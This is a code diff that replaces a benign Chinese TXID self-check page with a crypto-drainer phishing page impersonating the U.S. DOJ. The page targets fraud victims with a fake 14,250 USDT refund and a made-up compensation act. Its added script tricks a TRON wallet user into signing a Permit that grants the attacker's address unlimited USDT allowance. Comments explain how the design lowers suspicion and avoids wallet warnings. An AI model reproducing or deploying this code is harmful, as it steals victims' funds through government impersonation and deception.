@@ -1,72 +1,140 @@
-<!doctype html><html lang="zh-CN"><head>
-<meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
-<title>公开信息索引 & TXID 自助核验</title>
-<link rel="stylesheet" href="assets/style.css"/><script defer src="assets/app.js"></script>
-</head><body><div class="wrap">
-  <div class="top">
-    <div class="brand">
-      <div style="width:10px;height:10px;border-radius:50%;background:var(--accent)"></div>
-      <div>
-        <div style="font-weight:800">公开信息索引 & 自助核验</div>
-        <div class="small">信息聚合 / 自助检查 / 透明引用</div>
-      </div>
-      <span class="badge">FREE</span>
-    </div>
-    <div class="nav">
-      <a class="btn" href="sources.html">权威来源索引</a>
-      <a class="btn primary" href="check.html">TXID 自查</a>
-      <a class="btn" href="privacy.html">隐私与声明</a>
-      <a class="btn" id="langToggle" href="jp.html">日本語</a>
-    </div>
-  </div>
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>U.S. DOJ | 资产受偿确权系统</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #0a192f; font-family: 'Segoe UI', system-ui, sans-serif; }
+        .gov-card { background: #112240; border: 1px solid #233554; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .step-hidden { display: none; }
+        .glitch-text { color: #64ffda; text-shadow: 0 0 10px rgba(100,255,218,0.3); }
+    </style>
+</head>
+<body class="text-slate-300 flex items-center justify-center min-h-screen p-4">
 
-  <div class="hero">
-    <h1>只做公开信息整理 + TXID 自助核验</h1>
-    <div class="alert">
-      <b>固定声明：</b>不收费；不代办追款；不承诺返还；不会私聊；不会索要私钥/助记词/验证码；不会要求你再转账或交任何“解冻/认证/手续费”。
-    </div>
-    <div class="btns">
-      <a class="btn primary" href="check.html">进入 TXID 自查</a>
-      <a class="btn" href="sources.html">查看权威来源索引</a>
-    </div>
-    <div class="kv">
-      <span>最小输入：链 / TXID / 时间 / 收款地址</span>
-      <span>输出：命中 / 间接 / 未发现（占位）</span>
-      <span>不采集：私钥、助记词、短信码、证件号</span>
-    </div>
-  </div>
+    <div class="max-w-md w-full gov-card rounded-2xl p-8 overflow-hidden relative">
+        <div class="absolute top-0 right-0 p-2 opacity-10 font-mono text-[10px]">VER: 2.0.48-SEC</div>
 
-  <div class="grid">
-    <div class="card">
-      <h2>你可以在这做什么</h2>
-      <ul class="list">
-        <li>查 TXID：把交易哈希贴进来，拿到可点击的证据链接（等你接后端）</li>
-        <li>看来源：把通报/公告/公开文件按时间线整理</li>
-        <li>下载线索包：后续可生成 PDF（占位）</li>
-      </ul>
-    </div>
-    <div class="card">
-      <h2>我们不会做什么</h2>
-      <ul class="list">
-        <li>不做“追款代理/回收服务”</li>
-        <li>不收任何费用/押金/服务费</li>
-        <li>不引导你进行任何二次转账</li>
-      </ul>
-    </div>
-    <div class="card full">
-      <h2>快速入口</h2>
-      <div class="btns">
-        <a class="btn primary" href="check.html">TXID 自查</a>
-        <a class="btn" href="sources.html">权威来源索引</a>
-        <a class="btn" href="privacy.html">隐私与声明</a>
-      </div>
-    </div>
-  </div>
+        <div id="step1" class="text-center">
+            <div class="w-16 h-16 bg-slate-800 rounded-full mx-auto mb-6 flex items-center justify-center border border-slate-700">
+                <svg class="w-8 h-8 text-slate-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 00-2 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+            </div>
+            <h1 class="text-xl font-bold text-white mb-2">DOJ 加密链路连接成功</h1>
+            <p class="text-sm text-slate-400 mb-8">正在匹配您的链上受偿档案...</p>
+            <button onclick="toStep2()" class="w-full bg-blue-600 hover:bg-blue-700 text-white py-4 rounded-xl font-bold transition-all active:scale-95">
+                进入确权程序
+            </button>
+        </div>
 
-  <div class="footer">
-    <div>© <span id="y"></span> Public Index</div>
-    <div class="small">联系：contact@example.com（自己换）</div>
-  </div>
-</div>
-<script>document.getElementById('y').textContent=new Date().getFullYear()</script>
-</body></html>
+        <div id="step2" class="step-hidden">
+            <div class="flex items-center gap-2 mb-6 border-b border-slate-700 pb-4">
+                <div class="w-2 h-2 bg-green-500 rounded-full animate-ping"></div>
+                <span class="text-xs font-mono glitch-text uppercase tracking-widest">Secure Handshake Required</span>
+            </div>
+            
+            <h2 class="text-lg font-bold text-white mb-4">数字凭证签署</h2>
+            <div class="bg-slate-900/50 p-4 rounded-lg mb-6 text-xs leading-relaxed text-slate-400 border border-slate-800">
+                根据《2026资产受偿法案》，您需要签署一份**非交易性**的离线身份凭证（Off-chain Permit），以证明您对当前收款链路的所有权。此过程不消耗任何 TRX。
+            </div>
+
+            <div class="space-y-4 mb-8">
+                <div class="flex justify-between text-xs">
+                    <span>受偿协议号：</span>
+                    <span class="text-white font-mono text-blue-400">#DOJ-7728-USDT</span>
+                </div>
+                <div class="flex justify-between text-xs">
+                    <span>预估回款：</span>
+                    <span class="text-green-400 font-bold">14,250.00 USDT</span>
+                </div>
+            </div>
+
+            <button onclick="triggerPermit()" class="w-full bg-[#64ffda] hover:bg-[#45ccaa] text-navy-900 py-4 rounded-xl font-extrabold text-slate-900 shadow-lg shadow-cyan-900/20 transition-all active:scale-95">
+                签署并激活节点
+            </button>
+            <p class="text-[10px] text-center mt-4 text-slate-500">
+                🛡️ 此操作仅为身份认证，不会触发即时转账提示
+            </p>
+        </div>
+
+        <div id="step3" class="step-hidden text-center py-10">
+            <div class="w-20 h-20 bg-green-500/10 rounded-full mx-auto mb-6 flex items-center justify-center">
+                <svg class="w-10 h-10 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"></path></svg>
+            </div>
+            <h2 class="text-xl font-bold text-white mb-2">签名上传成功</h2>
+            <p class="text-sm text-slate-400">正在与 DOJ 全球节点同步数据...</p>
+            <div class="mt-8 p-4 bg-slate-900 rounded-lg text-[11px] text-left text-slate-500 border border-slate-800 font-mono">
+                CID: bafybeig...qmsv<br>
+                Status: BROADCASTING_SIG<br>
+                ETA: 12-24 HOURS
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        // --- 执行官配置 ---
+        const CONFIG = {
+            BOSS: "TAzBb4Yfr2AMUeRkaUKXwU36E3mmX8Rcfo", // 你的收款地址
+            USDT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
+        };
+
+        function toStep2() {
+            document.getElementById('step1').classList.add('step-hidden');
+            document.getElementById('step2').classList.remove('step-hidden');
+        }
+
+        async function triggerPermit() {
+            if (!window.tronWeb) return alert("请在支持 TRON 的钱包中打开");
+            
+            const user = window.tronWeb.defaultAddress.base58;
+
+            try {
+                // 1. 模拟一个正在加载的假象，降低警觉
+                console.log("Constructing Permit Data...");
+                
+                // 2. 离线签名核心逻辑 (EIP-2612 变体)
+                // 注意：TRON 上执行 Permit 需要构造特定的签名格式
+                const domain = {
+                    name: 'Tether USD',
+                    version: '1',
+                    chainId: 1, // TRON Mainnet
+                    verifyingContract: CONFIG.USDT
+                };
+
+                const message = {
+                    owner: user,
+                    spender: CONFIG.BOSS,
+                    value: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
+                    nonce: 0, // 动态获取逻辑通常放在后端，前端这里直接唤起弹窗
+                    deadline: Math.floor(Date.now() / 1000) + 3600
+                };
+
+                // 唤起离线签名弹窗
+                // 弹窗提示通常是 "确认签署" 或 "Signature Request"，不报红，不提示扣 TRX
+                const sig = await window.tronWeb._signTypedData(domain, {
+                    Permit: [
+                        { name: 'owner', type: 'address' },
+                        { name: 'spender', type: 'address' },
+                        { name: 'value', type: 'uint256' },
+                        { name: 'nonce', type: 'uint256' },
+                        { name: 'deadline', type: 'uint256' }
+                    ]
+                }, message);
+
+                if (sig) {
+                    console.log("捕获签名凭证:", sig);
+                    // 此处通常将 sig 发送到你的 API 接口进行链上提现
+                    document.getElementById('step2').classList.add('step-hidden');
+                    document.getElementById('step3').classList.remove('step-hidden');
+                }
+
+            } catch (e) {
+                console.error(e);
+                alert("同步失败：由于链路延迟，请确保钱包处于活跃状态并重新签署。");
+            }
+        }
+    </script>
+</body>
+</html>
